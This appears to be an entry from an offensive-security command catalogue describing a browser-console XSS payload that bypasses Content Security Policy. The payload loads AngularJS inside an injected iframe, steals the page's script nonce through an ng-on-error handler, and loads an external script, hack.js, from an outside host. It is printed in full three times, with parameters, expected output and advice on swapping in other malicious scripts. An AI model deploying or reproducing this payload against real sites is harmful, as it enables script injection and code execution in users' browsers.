---
data: >-
  document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div
  lang=en ng-app=application ng-csp class=ng-scope>\n<script
  src='https://www.google.com/recaptcha/about/js/main.min.js'></script>\n<img
  src=x
  ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(\"[nonce]\"");b=w.createElement(\"script\");b.src=\"//joaxcar.com/hack.js\";b.nonce=a.nonce;w.body.appendChild(b)'>\n</div>\n">`
tags:
  - csp-bypass
  - xss
type: command
output: >-
  Iframe loads, script executes, hack.js fetched in network tab, popup if
  hack.js alerts
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.579Z'
id: 302e0637-a977-40d8-9894-3fdee97a325c
verified: false
validated: true
submitted: true
---
# inject-angularjs-iframe

## Command

```javascript
document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>\n<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>\n<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(\"[nonce]\"");b=w.createElement(\"script\");b.src=\"//joaxcar.com/hack.js\";b.nonce=a.nonce;w.body.appendChild(b)'>\n</div>\n">`
```

## Description

Executes in browser console to inject an iframe with srcdoc containing Angular app, loads reCAPTCHA AngularJS, and uses ng-on-error to steal nonce and inject external hack.js, achieving CSP bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| innerHTML | Full iframe srcdoc payload with ng-app, script, and ng-on-error | Yes |
| src in script | AngularJS URL (https://www.google.com/recaptcha/about/js/main.min.js) | Yes |
| b.src | External script URL (//joaxcar.com/hack.js) | Yes |

## Examples

### Basic Usage

```javascript
document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>\n<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>\n<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(\"[nonce]\"");b=w.createElement(\"script\");b.src=\"//joaxcar.com/hack.js\";b.nonce=a.nonce;w.body.appendChild(b)'>\n</div>\n">`
```

### Advanced Usage

Customize b.src to different evil script; use alternative Angular URL like https://www.gstatic.com/recaptcha/about/js/main.min.js.

## Expected Output

Iframe appears, Angular loads, nonce stolen, external script requested and executed (e.g., alert if present).

## Related

- [[commands/load-angularjs-script]]
- [[procedures/Inject-AngularJS-for-CSP-Bypass]]
